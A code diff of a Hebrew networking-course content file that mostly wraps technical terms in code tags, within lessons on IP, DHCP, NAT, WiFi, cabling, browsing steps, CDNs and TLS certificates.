+          <p>חבילת <code>IP</code> כוללת <strong><code>IP Header</code></strong> ולאחריו <code>Data</code>. הגודל המינימלי של ה־<code>Header</code> הוא 20 בתים.</p>
+          <p>שדות עיקריים ב־<code>Header</code>:</p>
           <ul>
-            <li><strong>Source IP</strong> — כתובת השולח</li>
-            <li><strong>Destination IP</strong> — כתובת היעד</li>
-            <li><strong>TTL</strong> — <code>Time To Live</code> — מונה שמפחית בכל נתב. כשמגיע ל־0 החבילה נזרקת, מה שמונע לולאות אינסופיות</li>
-            <li><strong>Protocol</strong> — מזהה את פרוטוקול השכבה הבאה: <code>TCP</code>=6, <code>UDP</code>=17, <code>ICMP</code>=1</li>
-            <li><strong>Checksum</strong> — בדיקת שלמות הנתונים</li>
+            <li><strong><code>Source IP</code></strong> — כתובת השולח</li>
+            <li><strong><code>Destination IP</code></strong> — כתובת היעד</li>
+            <li><strong><code>TTL</code></strong> — <code>Time To Live</code> — מונה שמפחית בכל נתב. כשמגיע ל־0 החבילה נזרקת, מה שמונע לולאות אינסופיות</li>
+            <li><strong><code>Protocol</code></strong> — מזהה את פרוטוקול השכבה הבאה: <code>TCP</code>=6, <code>UDP</code>=17, <code>ICMP</code>=1</li>
+            <li><strong><code>Checksum</code></strong> — בדיקת שלמות הנתונים</li>
           </ul>
         `
       },
@@ -1414,39 +1414,39 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
         type: "explanation",
         title: "מסכת רשת (Subnet Mask) ו־Default Gateway",
         content: `
-          <p><strong>Subnet Mask</strong> — מסכת רשת</p>
+          <p><strong><code>Subnet Mask</code></strong> — מסכת רשת</p>
           <p>קובע אילו ביטים בכתובת <code>IP</code> שייכים לרשת המקומית.</p>
           <p>כדי לחשב את כתובת הרשת, מבצעים פעולת <code>AND</code> לוגי בין ה־<code>IP</code> למסכה.</p>
           <p><strong>דוגמה:</strong></p>
           <p>מסכה <code>255.255.255.0</code> אומרת ש־3 הבתים הראשונים הם כתובת הרשת, והבית האחרון מזהה את המחשב ברשת.</p>
 
-          <p><strong>Default Gateway</strong> — שער ברירת מחדל</p>
+          <p><strong><code>Default Gateway</code></strong> — שער ברירת מחדל</p>
           <p>כשהיעד נמצא ברשת אחרת, המחשב שולח את החבילה ל־<code>Default Gateway</code>.</p>
           <p>זהו הנתב המקומי שמחבר את הרשת לרשתות אחרות.</p>
-          <p>בלי Default Gateway — אין יציאה לאינטרנט.</p>
+          <p>בלי <code>Default Gateway</code> — אין יציאה לאינטרנט.</p>
         `
       },
       {
         type: "explanation",
         title: "ICMP, DHCP ו-NAT",
         content: `
-          <p><strong>ICMP</strong> — הודעות בקרה ושגיאות</p>
+          <p><strong><code>ICMP</code></strong> — הודעות בקרה ושגיאות</p>
           <p>הפקודה <code>ping</code> שולחת <code>Echo Request</code> ומקבלת <code>Echo Reply</code>.</p>
           <p>שדה ה־<code>TTL</code> (Time To Live) מופחת ב־1 בכל נתב.</p>
-          <p>כשה־TTL מגיע ל־0 — החבילה נזרקת, והנתב שולח הודעת <code>ICMP Time Exceeded</code>.</p>
+          <p>כשה־<code>TTL</code> מגיע ל־0 — החבילה נזרקת, והנתב שולח הודעת <code>ICMP Time Exceeded</code>.</p>
           <p>הפקודה <code>traceroute</code> מנצלת התנהגות זו כדי לגלות את מסלול החבילה.</p>
 
-          <p><strong>DHCP</strong> — הגדרות רשת אוטומטיות</p>
+          <p><strong><code>DHCP</code></strong> — הגדרות רשת אוטומטיות</p>
           <p>פרוטוקול שמאפשר למחשב חדש לקבל הגדרות רשת ללא הגדרה ידנית.</p>
-          <p><strong>ארבעת שלבי DHCP:</strong></p>
+          <p><strong>ארבעת שלבי <code>DHCP</code>:</strong></p>
           <ol>
-            <li><strong>Discover</strong> — המחשב שולח שידור כללי: "מי שרת ה־<code>DHCP</code>?"</li>
-            <li><strong>Offer</strong> — השרת מציע: כתובת <code>IP</code>, מסכת רשת, <code>Gateway</code>, שרת <code>DNS</code></li>
-            <li><strong>Request</strong> — המחשב מאשר שהוא רוצה את ההצעה</li>
-            <li><strong>Ack</strong> — השרת מאשר סופית</li>
+            <li><strong><code>Discover</code></strong> — המחשב שולח שידור כללי: "מי שרת ה־<code>DHCP</code>?"</li>
+            <li><strong><code>Offer</code></strong> — השרת מציע: כתובת <code>IP</code>, מסכת רשת, <code>Gateway</code>, שרת <code>DNS</code></li>
+            <li><strong><code>Request</code></strong> — המחשב מאשר שהוא רוצה את ההצעה</li>
+            <li><strong><code>Ack</code></strong> — השרת מאשר סופית</li>
           </ol>
 
-          <p><strong>NAT</strong> — תרגום כתובות</p>
+          <p><strong><code>NAT</code></strong> — תרגום כתובות</p>
           <p>כתובות פרטיות — <code>10.x</code>, <code>172.16.x</code>, <code>192.168.x</code> — לא ניתנות לניתוב באינטרנט.</p>
           <p>הנתב מחליף את כתובת המקור והפורט לכתובת <code>IP</code> ציבורית ופורט ייחודי.</p>
           <p>טכניקה זו נקראת <code>PAT</code>.</p>
@@ -1462,10 +1462,10 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
             title: "למה ה־IP נגמר? IPv4 vs IPv6",
             icon: "🌐",
             content: `
-              <p><strong>IPv4</strong> תומך ב־2^32 כתובות — כ־4.3 מיליארד.</p>
+              <p><strong><code>IPv4</code></strong> תומך ב־2^32 כתובות — כ־4.3 מיליארד.</p>
               <p>נשמע הרבה, אבל האינטרנט גדל מעבר למספר הזה.</p>
-              <p><strong>IPv6</strong> תומך ב־2^128 כתובות — מספיק לכל גרגר חול על כדור הארץ ועוד.</p>
-              <p><code>NAT</code> מאפשר למיליוני מחשבים להשתמש ב-IP ציבורי אחד, אבל זהו פתרון עוקף. IPv6 פותר את הבעיה מהשורש.</p>
+              <p><strong><code>IPv6</code></strong> תומך ב־2^128 כתובות — מספיק לכל גרגר חול על כדור הארץ ועוד.</p>
+              <p><code>NAT</code> מאפשר למיליוני מחשבים להשתמש ב-<code>IP</code> ציבורי אחד, אבל זהו פתרון עוקף. <code>IPv6</code> פותר את הבעיה מהשורש.</p>
             `
           },
           {
@@ -1485,7 +1485,7 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
         type: "demo",
         title: "המדריך מדגים: מה מראה Traceroute",
         content: `
-          <p>כשרצים traceroute (או כלי ויזואלי דומה), זה סוג הפלט – רואים את המסלול שעוברת החבילה:</p>
+          <p>כשרצים <code>traceroute</code> (או כלי ויזואלי דומה), זה סוג הפלט – רואים את המסלול שעוברת החבילה:</p>
           <div class="code-preview">
             <pre><code>1   router.local (192.168.1.1)    2 ms
 2   isp-gateway (10.0.0.1)       12 ms  
@@ -1494,7 +1494,7 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
           </div>
           <p class="demo-note">📋 פירוש הפלט:</p>
           <ul>
-            <li>כל שורה = <strong>hop</strong> אחד — רכיב ברשת — נתב, שרת — שהחבילה עברה דרכו.</li>
+            <li>כל שורה = <strong><code>hop</code></strong> אחד — רכיב ברשת — נתב, שרת — שהחבילה עברה דרכו.</li>
             <li>מספרי ה־<code>ms</code> — זמן התגובה לאותו hop.</li>
             <li>כך רואים את "הדרך" המלאה מהמחשב ועד לשרת היעד.</li>
           </ul>
@@ -1837,9 +1837,9 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
           {
             title: "מה ההבדל בין Router ביתי לתעשייתי?",
             icon: "🏭",
-            content: `<p><strong>Router ביתי</strong> — כמו של ספק האינטרנט</p>
+            content: `<p><strong><code>Router</code> ביתי</strong> — כמו של ספק האינטרנט</p>
               <p>משלב הכל בקופסה אחת: <code>Router</code> + <code>Switch</code> + <code>WiFi AP</code> + <code>NAT</code> + <code>DHCP</code> + <code>Firewall</code> בסיסי.</p>
-              <p><strong>Router תעשייתי</strong> — <code>Cisco</code>, <code>Juniper</code></p>
+              <p><strong><code>Router</code> תעשייתי</strong> — <code>Cisco</code>, <code>Juniper</code></p>
               <p>לכל פונקציה מכשיר נפרד: <code>Router</code> נפרד, <code>Managed Switch</code> נפרד, <code>Firewall</code> נפרד, <code>AP</code> נפרד.</p>
               <p><strong>החשיבה:</strong></p>
               <p>בבית — פשטות חשובה יותר מביצועים.</p>
@@ -1848,7 +1848,7 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
           {
             title: "מה זה SDN – רשת מוגדרת בתוכנה?",
             icon: "💻",
-            content: `<p><strong>SDN</strong> — <code>Software Defined Networking</code></p>
+            content: `<p><strong><code>SDN</code></strong> — <code>Software Defined Networking</code></p>
               <p>הפרדה בין ה-<code>Control Plane</code> — שמקבל החלטות ניתוב — ל-<code>Data Plane</code> — שמעביר נתונים בפועל.</p>
               <p>במקום שכל נתב יחליט בעצמו, מרכז <code>SDN</code> אחד שולח הוראות לכל הנתבים.</p>
               <p>כמו <code>GPS</code> מרכזי שמנחה את כל הנהגים.</p>
@@ -1919,8 +1919,8 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
           <ul>
             <li><strong>כבל נחושת</strong> — <code>Ethernet</code> — אותות חשמליים</li>
             <li><strong>סיב אופטי</strong> — פולסים של אור</li>
-            <li><strong>ADSL</strong> — תקשורת דרך קו טלפון</li>
-            <li><strong>WiFi</strong> — גלי רדיו</li>
+            <li><strong><code>ADSL</code></strong> — תקשורת דרך קו טלפון</li>
+            <li><strong><code>WiFi</code></strong> — גלי רדיו</li>
             <li><strong>לווין</strong> — אותות אלקטרומגנטיים</li>
             <li><strong>סלולר</strong> — <code>4G/5G</code> — רשתות אלחוטיות</li>
           </ul>
@@ -1947,7 +1947,7 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
           <p><strong><code>Throughput</code></strong> — קצב בפועל</p>
           <p>קצב ההעברה האמיתי.</p>
           <p>תמיד נמוך מה-<code>Bandwidth</code> התאורטי.</p>
-          <p><strong>גורמים שמפחיתים Throughput:</strong></p>
+          <p><strong>גורמים שמפחיתים <code>Throughput</code>:</strong></p>
           <ul>
             <li>עומס ברשת</li>
             <li>אובדן חבילות</li>
@@ -1965,26 +1965,26 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
         type: "explanation",
         title: "כבלים – סוגים ותקנים",
         content: `
-          <p><strong>UTP</strong> — <code>Unshielded Twisted Pair</code></p>
+          <p><strong><code>UTP</code></strong> — <code>Unshielded Twisted Pair</code></p>
           <p>כבלי <code>Ethernet</code> מזוגות חוטים מפותלים:</p>
           <table class="content-table">
             <tr><th>קטגוריה</th><th>מהירות</th><th>שימוש</th></tr>
-            <tr><td>Cat5e</td><td>1 Gbps עד 100m</td><td>רשתות ביתיות/משרדיות</td></tr>
-            <tr><td>Cat6</td><td>10 Gbps עד 55m</td><td>מרכזי נתונים</td></tr>
-            <tr><td>Cat6a</td><td>10 Gbps עד 100m</td><td>מרכזי נתונים מודרניים</td></tr>
-            <tr><td>Cat8</td><td>40 Gbps עד 30m</td><td>בין שרתים</td></tr>
+            <tr><td><code>Cat5e</code></td><td>1 Gbps עד 100m</td><td>רשתות ביתיות/משרדיות</td></tr>
+            <tr><td><code>Cat6</code></td><td>10 Gbps עד 55m</td><td>מרכזי נתונים</td></tr>
+            <tr><td><code>Cat6a</code></td><td>10 Gbps עד 100m</td><td>מרכזי נתונים מודרניים</td></tr>
+            <tr><td><code>Cat8</code></td><td>40 Gbps עד 30m</td><td>בין שרתים</td></tr>
           </table>
           <p><strong>סיב אופטי</strong> — <code>Fiber Optic</code></p>
           <p>קיימים שני סוגים:</p>
           <ul>
-            <li><strong>Single-mode</strong> — ליבה דקה, מתאים למרחקים ארוכים עד 100 ק"מ</li>
-            <li><strong>Multi-mode</strong> — ליבה רחבה, מתאים עד 2 ק"מ, זול יותר</li>
+            <li><strong><code>Single-mode</code></strong> — ליבה דקה, מתאים למרחקים ארוכים עד 100 ק"מ</li>
+            <li><strong><code>Multi-mode</code></strong> — ליבה רחבה, מתאים עד 2 ק"מ, זול יותר</li>
           </ul>
           <p><strong>קונקטורים נפוצים:</strong></p>
           <ul>
             <li><code>RJ-45</code> – לכבלי <code>Ethernet</code></li>
             <li><code>LC</code>, <code>SC</code> – לסיב אופטי</li>
-            <li><code>SFP</code> – מודולים ניתנים להחלפה ב-Switch</li>
+            <li><code>SFP</code> – מודולים ניתנים להחלפה ב-<code>Switch</code></li>
           </ul>
         `
       },
@@ -1996,18 +1996,18 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
           <p>שני תדרים עיקריים:</p>
           <table class="content-table">
             <tr><th>תדר</th><th>טווח</th><th>מהירות</th><th>חסרון</th></tr>
-            <tr><td>2.4 GHz</td><td>ארוך יותר</td><td>נמוכה יותר</td><td>עומס – מיקרוגל, Bluetooth</td></tr>
+            <tr><td>2.4 GHz</td><td>ארוך יותר</td><td>נמוכה יותר</td><td>עומס – מיקרוגל, <code>Bluetooth</code></td></tr>
             <tr><td>5 GHz</td><td>קצר יותר</td><td>גבוהה יותר</td><td>חוצה קירות פחות טוב</td></tr>
-            <tr><td>6 GHz — WiFi 6E</td><td>קצר</td><td>גבוהה מאוד</td><td>חדש, פחות מכשירים</td></tr>
+            <tr><td>6 GHz — <code>WiFi 6E</code></td><td>קצר</td><td>גבוהה מאוד</td><td>חדש, פחות מכשירים</td></tr>
           </table>
-          <p><strong>דורות WiFi:</strong></p>
+          <p><strong>דורות <code>WiFi</code>:</strong></p>
           <ul>
-            <li><strong>WiFi 4</strong> — <code>802.11n</code> — עד 600 Mbps — תדרי 2.4+5 GHz</li>
-            <li><strong>WiFi 5</strong> — <code>802.11ac</code> — עד 3.5 Gbps — תדר 5 GHz</li>
-            <li><strong>WiFi 6</strong> — <code>802.11ax</code> — עד 9.6 Gbps — תדרי 2.4+5 GHz</li>
+            <li><strong><code>WiFi 4</code></strong> — <code>802.11n</code> — עד 600 Mbps — תדרי 2.4+5 GHz</li>
+            <li><strong><code>WiFi 5</code></strong> — <code>802.11ac</code> — עד 3.5 Gbps — תדר 5 GHz</li>
+            <li><strong><code>WiFi 6</code></strong> — <code>802.11ax</code> — עד 9.6 Gbps — תדרי 2.4+5 GHz</li>
             <li><code>OFDMA</code> — מאפשר יותר מכשירים בו-זמנית</li>
           </ul>
-          <p><strong>CSMA/CA</strong> — <code>Collision Avoidance</code></p>
+          <p><strong><code>CSMA/CA</code></strong> — <code>Collision Avoidance</code></p>
           <p>ב-<code>WiFi</code> לא ניתן לזהות התנגשויות כמו ב-<code>Ethernet</code>.</p>
           <p>לכן משתמשים בשיטת מניעה:</p>
           <ol>
@@ -2029,22 +2029,22 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
         content: `
           <p>איך מייצגים 0 ו-1 פיזית?</p>
           <p>כל מדיום מגדיר <strong>שיטת קידוד</strong> שונה.</p>
-          <p><strong>NRZ</strong> — <code>Non-Return to Zero</code></p>
+          <p><strong><code>NRZ</code></strong> — <code>Non-Return to Zero</code></p>
           <p>1 = מתח גבוה, 0 = מתח נמוך.</p>
           <p>פשוט, אבל בעייתי ברצפים ארוכים של 0 או 1 — קשה לסנכרון.</p>
 
-          <p><strong>Manchester Encoding</strong></p>
+          <p><strong><code>Manchester Encoding</code></strong></p>
           <p>כל ביט = מעבר.</p>
           <p>1 = מנמוך לגבוה באמצע הביט.</p>
           <p>0 = מגבוה לנמוך.</p>
           <p>מאפשר סנכרון מובנה.</p>
           <p><code>Ethernet</code> ישן — 10 Mbps — השתמש בשיטה זו.</p>
 
-          <p><strong>4B/5B</strong></p>
+          <p><strong><code>4B/5B</code></strong></p>
           <p>כל 4 ביטים מקודדים כ-5 ביטים שמבטיחים מינימום מעברים לסנכרון.</p>
           <p>בשימוש ב-<code>Fast Ethernet</code> — 100 Mbps.</p>
 
-          <p><strong>PAM4</strong> — <code>Pulse Amplitude Modulation</code></p>
+          <p><strong><code>PAM4</code></strong> — <code>Pulse Amplitude Modulation</code></p>
           <p>4 רמות מתח — 00, 01, 10, 11 — מכפיל את כמות הנתונים.</p>
           <p><code>400 Gbps Ethernet</code> משתמש בשיטה זו.</p>
 
@@ -2056,12 +2056,12 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
         type: "explanation",
         title: "Full Duplex, Half Duplex ו-CSMA/CD",
         content: `
-          <p><strong>Half Duplex</strong></p>
+          <p><strong><code>Half Duplex</code></strong></p>
           <p>תקשורת בכיוון אחד בלבד בכל רגע נתון.</p>
           <p><code>Hub</code> עובד במצב <code>Half Duplex</code>.</p>
           <p>כששתי תחנות שולחות בו-זמנית, הסיגנלים מתנגשים — זו <strong>התנגשות</strong> — <code>Collision</code>.</p>
 
-          <p><strong>CSMA/CD</strong> — <code>Carrier Sense Multiple Access / Collision Detection</code></p>
+          <p><strong><code>CSMA/CD</code></strong> — <code>Carrier Sense Multiple Access / Collision Detection</code></p>
           <p>אלגוריתם לטיפול בהתנגשויות ב-<code>Ethernet</code> ישן:</p>
           <ol>
             <li>האזן לפני שאתה שולח — <code>Carrier Sense</code></li>
@@ -2070,12 +2070,12 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
             <li>המתן זמן אקראי — <code>Backoff</code> — ונסה שוב</li>
           </ol>
 
-          <p><strong>Full Duplex</strong></p>
+          <p><strong><code>Full Duplex</code></strong></p>
           <p>שליחה וקבלה בו-זמנית — ללא התנגשויות.</p>
           <p><code>Switch</code> מודרני בשילוב כרטיס רשת מודרני עובדים ב-<code>Full Duplex</code>.</p>
           <p>זה המצב הנפוץ כיום.</p>
 
-          <p><strong>Auto-Negotiation</strong></p>
+          <p><strong><code>Auto-Negotiation</code></strong></p>
           <p>מסדר באופן אוטומטי את המהירות ומצב ה-<code>Duplex</code> בין שני הצדדים.</p>
         `
       },
@@ -2096,13 +2096,13 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
           {
             title: "Power over Ethernet – חשמל דרך כבל רשת",
             icon: "⚡",
-            content: `<p><strong>PoE</strong> — <code>Power over Ethernet</code></p>
+            content: `<p><strong><code>PoE</code></strong> — <code>Power over Ethernet</code></p>
               <p>מעביר חשמל ונתונים על אותו כבל <code>Cat5e</code>/<code>Cat6</code>.</p>
-              <p>מכשירים כמו נקודות WiFi, טלפוני IP ומצלמות אבטחה יכולים לקבל חשמל ישירות מה-Switch, ללא חיבור חשמל נפרד.</p>
-              <p>סוגי PoE:</p>
+              <p>מכשירים כמו נקודות <code>WiFi</code>, טלפוני <code>IP</code> ומצלמות אבטחה יכולים לקבל חשמל ישירות מה-<code>Switch</code>, ללא חיבור חשמל נפרד.</p>
+              <p>סוגי <code>PoE</code>:</p>
               <ul>
-                <li><strong>PoE+</strong> – עד 30W</li>
-                <li><strong>PoE++</strong> – עד 60-100W</li>
+                <li><strong><code>PoE+</code></strong> – עד 30W</li>
+                <li><strong><code>PoE++</code></strong> – עד 60-100W</li>
               </ul>
               <p>לדוגמה: מצלמה בתקרה – כבל אחד עושה הכל.</p>`
           }
@@ -2153,25 +2153,25 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
         title: "הסיפור המלא – גלישה ל-Facebook",
         content: `
           <p>כל גלישה לאתר עוברת שמונה שלבים ברצף.</p>
-          <p><strong>שלב 1 – DHCP</strong></p>
+          <p><strong>שלב 1 – <code>DHCP</code></strong></p>
           <p>המחשב מקבל <code>IP</code>, <code>Subnet Mask</code>, <code>Default Gateway</code> ושרת <code>DNS</code>.</p>
           <p>בלי שלב זה לא ניתן לגלוש כלל.</p>
-          <p><strong>שלב 2 – DNS</strong></p>
+          <p><strong>שלב 2 – <code>DNS</code></strong></p>
           <p>הדפדפן צריך לתרגם את <code>facebook.com</code> לכתובת IP.</p>
           <p>שולח שאילתה לשרת <code>DNS</code> ומקבל בחזרה <code>31.13.72.65</code>.</p>
-          <p><strong>שלב 3 – בדיקת Subnet</strong></p>
+          <p><strong>שלב 3 – בדיקת <code>Subnet</code></strong></p>
           <p>האם <code>31.13.72.65</code> נמצא ברשת שלנו — למשל <code>192.168.1.x</code>?</p>
           <p>לא — שולחים את החבילה ל-<code>Default Gateway</code> — הנתב.</p>
-          <p><strong>שלב 4 – ARP</strong></p>
+          <p><strong>שלב 4 – <code>ARP</code></strong></p>
           <p>צריך את כתובת ה-<code>MAC</code> של הנתב.</p>
           <p>שולחים <code>ARP Request</code> ומקבלים את ה-<code>MAC</code> בחזרה.</p>
-          <p><strong>שלב 5 – Switch</strong></p>
+          <p><strong>שלב 5 – <code>Switch</code></strong></p>
           <p>ה-<code>Switch</code> מעביר את ה-<code>Frame</code> לפי ה-<code>MAC</code> של הנתב.</p>
           <p><strong>שלב 6 – נתבים</strong></p>
-          <p>הנתב ומספר נתבים נוספים לאורך הדרך מעבירים את החבילה עד שרתי Facebook.</p>
-          <p><strong>שלב 7 – TCP Handshake</strong></p>
+          <p>הנתב ומספר נתבים נוספים לאורך הדרך מעבירים את החבילה עד שרתי <code>Facebook</code>.</p>
+          <p><strong>שלב 7 – <code>TCP Handshake</code></strong></p>
           <p>מבצעים <code>SYN</code>, <code>SYN-ACK</code>, <code>ACK</code> — החיבור מוכן לשימוש.</p>
-          <p><strong>שלב 8 – HTTP GET</strong></p>
+          <p><strong>שלב 8 – <code>HTTP GET</code></strong></p>
           <p>הדפדפן שולח בקשת <code>GET</code>.</p>
           <p>השרת מחזיר <code>HTML</code> — הדפדפן מציג את הדף.</p>
         `
@@ -2209,7 +2209,7 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
         type: "explanation",
         title: "סדר הפעולות – מלמטה למעלה",
         content: `
-          <p>בשליחת בקשת GET, כל שכבה מוסיפה Header:</p>
+          <p>בשליחת בקשת <code>GET</code>, כל שכבה מוסיפה <code>Header</code>:</p>
           <div class="diagram-container">
             <svg viewBox="0 0 340 180" class="content-diagram">
               <rect x="10" y="5" width="320" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
@@ -2226,12 +2226,12 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
               <text x="330" y="95" font-size="8" fill="var(--accent-gold)" transform="rotate(-90, 330, 95)">קבלה: Decapsulation ↑</text>
             </svg>
           </div>
-          <p>בקבלה — Decapsulation מלמטה למעלה:</p>
+          <p>בקבלה — <code>Decapsulation</code> מלמטה למעלה:</p>
           <ul>
-            <li>שכבת הקו מקלפת את Ethernet Header</li>
-            <li>שכבת הרשת מקלפת את IP Header</li>
-            <li>שכבת התעבורה מקלפת את TCP Header</li>
-            <li>עד שמגיעים ל-HTTP Data</li>
+            <li>שכבת הקו מקלפת את <code>Ethernet Header</code></li>
+            <li>שכבת הרשת מקלפת את <code>IP Header</code></li>
+            <li>שכבת התעבורה מקלפת את <code>TCP Header</code></li>
+            <li>עד שמגיעים ל-<code>HTTP Data</code></li>
           </ul>
         `
       },
@@ -2239,19 +2239,19 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
         type: "explanation",
         title: "מה קורה כשהשרת מאחורי CDN",
         content: `
-          <p><strong>CDN</strong> — <code>Content Delivery Network</code></p>
+          <p><strong><code>CDN</code></strong> — <code>Content Delivery Network</code></p>
           <p><code>Facebook</code>, <code>Google</code>, <code>Netflix</code> — לא ניגשים ישירות לשרת <code>Origin</code>.</p>
           <ol>
-            <li><strong>DNS</strong> — <code>facebook.com</code> מתרגם ל-<code>IP</code> של <code>CDN Edge Node</code> הקרוב — <code>Anycast</code></li>
-            <li><strong>TLS Handshake</strong> — מתבצע מול ה-<code>Edge Node</code>, לא מול <code>Origin</code>. זמן תגובה קצר!</li>
-            <li><strong>HTTP GET</strong> — ה-<code>Edge</code> בודק <code>cache</code>:
+            <li><strong><code>DNS</code></strong> — <code>facebook.com</code> מתרגם ל-<code>IP</code> של <code>CDN Edge Node</code> הקרוב — <code>Anycast</code></li>
+            <li><strong><code>TLS Handshake</code></strong> — מתבצע מול ה-<code>Edge Node</code>, לא מול <code>Origin</code>. זמן תגובה קצר!</li>
+            <li><strong><code>HTTP GET</code></strong> — ה-<code>Edge</code> בודק <code>cache</code>:
               <ul>
-                <li><strong>Cache HIT</strong> — מגיש מיידית</li>
-                <li><strong>Cache MISS</strong> — מביא מ-<code>Origin</code>, שומר, ואז מגיש</li>
+                <li><strong><code>Cache HIT</code></strong> — מגיש מיידית</li>
+                <li><strong><code>Cache MISS</code></strong> — מביא מ-<code>Origin</code>, שומר, ואז מגיש</li>
               </ul>
             </li>
-            <li><strong>תמונות, JS, CSS</strong> — מגיעים מה-<code>Edge</code></li>
-            <li><strong>HTML דינמי</strong> — עשוי לעבור ל-<code>Origin</code></li>
+            <li><strong>תמונות, <code>JS</code>, <code>CSS</code></strong> — מגיעים מה-<code>Edge</code></li>
+            <li><strong><code>HTML</code> דינמי</strong> — עשוי לעבור ל-<code>Origin</code></li>
           </ol>
           <p>זו הסיבה ש-<code>Facebook</code> נטען תוך 200ms מישראל, למרות שהשרתים הראשיים באמריקה.</p>
           <p>שרת <code>CDN Edge</code> בתל אביב או קפריסין מגיש את רוב התוכן.</p>
@@ -2265,11 +2265,11 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
           {
             title: "כמה פקטות בגלישה אחת?",
             icon: "📊",
-            content: `<p>גלישה פשוטה לעמוד GitHub שולחת כ-200 פקטות.</p>
+            content: `<p>גלישה פשוטה לעמוד <code>GitHub</code> שולחת כ-200 פקטות.</p>
               <ul>
-                <li>DHCP: 4 פקטות</li>
-                <li>DNS: 2 פקטות</li>
-                <li>ARP: 2 פקטות</li>
+                <li><code>DHCP</code>: 4 פקטות</li>
+                <li><code>DNS</code>: 2 פקטות</li>
+                <li><code>ARP</code>: 2 פקטות</li>
                 <li><code>TCP Handshake</code>: 3 פקטות</li>
                 <li><code>TLS Handshake</code>: כ-8 פקטות</li>
                 <li>בקשות <code>HTTP/2</code>: עשרות פקטות</li>
@@ -2281,13 +2281,13 @@ TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
           {
             title: "מה אם ה-DNS שלך לא עובד?",
             icon: "🔍",
-            content: `<p>כדי לאבחן בעיית DNS, מריצים את הניסוי הבא:</p>
+            content: `<p>כדי לאבחן בעיית <code>DNS</code>, מריצים את הניסוי הבא:</p>
               <ul>
                 <li>אם <code>ping 8.8.8.8</code> עובד אבל <code>ping google.com</code> נכשל — יש בעיית <code>DNS</code>.</li>
                 <li>אם <code>nslookup google.com 8.8.8.8</code> עובד — ה-<code>DNS</code> של ספק האינטרנט מושבת, אבל <code>DNS</code> ציבורי תקין.</li>
                 <li>פתרון: שנה את שרת ה-<code>DNS</code> בהגדרות הרשת.</li>
               </ul>
-              <p><strong>DNS הוא נקודת חנק.</strong></p>
+              <p><strong><code>DNS</code> הוא נקודת חנק.</strong></p>
               <p>ספק האינטרנט שולט ב-<code>DNS</code> ויכול לחסום אתרים.</p>
               <p>פרוטוקולים כמו <code>DoH</code> ו-<code>VPN</code> עוקפים מגבלה זו.</p>`
           }
@@ -2873,7 +2873,7 @@ Addresses: 142.250.185.46</code></pre>
         type: "explanation",
         title: "אישורים ו-CA – Chain of Trust",
         content: `
-          <p><strong>Certificate</strong> (אישור) מכיל:</p>
+          <p><strong><code>Certificate</code></strong> (אישור) מכיל:</p>
           <ul>
             <li>שם הדומיין</li>
             <li>המפתח הציבורי של השרת</li>
@@ -2901,7 +2901,7 @@ Addresses: 142.250.185.46</code></pre>
           </div>
           <p><strong>Let's Encrypt</strong> — <code>CA</code> בחינם שפתרה את בעיית עלות האישורים.</p>
           <p>היום רוב האתרים משתמשים בה.</p>
-          <p><strong>Self-Signed Certificate</strong> — שרת שחתם על עצמו.</p>
+          <p><strong><code>Self-Signed Certificate</code></strong> — שרת שחתם על עצמו.</p>
           <p>הדפדפן לא סומך עליו ומציג אזהרה — שימושי לסביבות <code>dev</code> ו-<code>testing</code> בלבד.</p>
         `
       },
@@ -2970,11 +2970,11 @@ response = requests.get('https://self-signed.badssl.com', verify=False)</code></
           <div class="chapter-summary">
             <h3>נקודות מפתח:</h3>
             <ul>
-              <li>HTTPS = HTTP over TLS. פורט 443. מוצפן end-to-end</li>
-              <li>הצפנה סימטרית — AES — מהירה, מפתח משותף. אסימטרית — RSA/ECC — לחילופי מפתח</li>
-              <li>TLS Handshake: Hello → Certificate → Key Exchange → Finished → AES</li>
-              <li>Certificate מאמת שהשרת הוא מי שהוא טוען. CA חותם על האישור</li>
-              <li>Let's Encrypt – CA חינמי. Self-Signed – לא מהימן לדפדפן</li>
+              <li><code>HTTPS</code> = <code>HTTP</code> over <code>TLS</code>. פורט 443. מוצפן <code>end-to-end</code></li>
+              <li>הצפנה סימטרית — <code>AES</code> — מהירה, מפתח משותף. אסימטרית — <code>RSA</code>/<code>ECC</code> — לחילופי מפתח</li>
+              <li><code>TLS Handshake</code>: <code>Hello</code> → <code>Certificate</code> → <code>Key Exchange</code> → <code>Finished</code> → <code>AES</code></li>
+              <li><code>Certificate</code> מאמת שהשרת הוא מי שהוא טוען. <code>CA</code> חותם על האישור</li>
+              <li><code>Let's Encrypt</code> – <code>CA</code> חינמי. <code>Self-Signed</code> – לא מהימן לדפדפן</li>
               <li>🔒 = הקשר מוצפן, לא שהאתר אמין!</li>
             </ul>
           </div>
@@ -3011,9 +3011,9 @@ response = requests.get('https://self-signed.badssl.com', verify=False)</code></
           <p>דואר אלקטרוני משתמש בשלושה פרוטוקולים נפרדים, כל אחד לתפקיד שונה.</p>
           <table class="content-table">
             <tr><th>פרוטוקול</th><th>פורט</th><th>תפקיד</th></tr>
-            <tr><td>SMTP</td><td>25 / 587</td><td>שליחת אימייל</td></tr>
-            <tr><td>IMAP</td><td>143 / 993</td><td>קריאת אימייל — מסנכרן, ממשיך בשרת</td></tr>
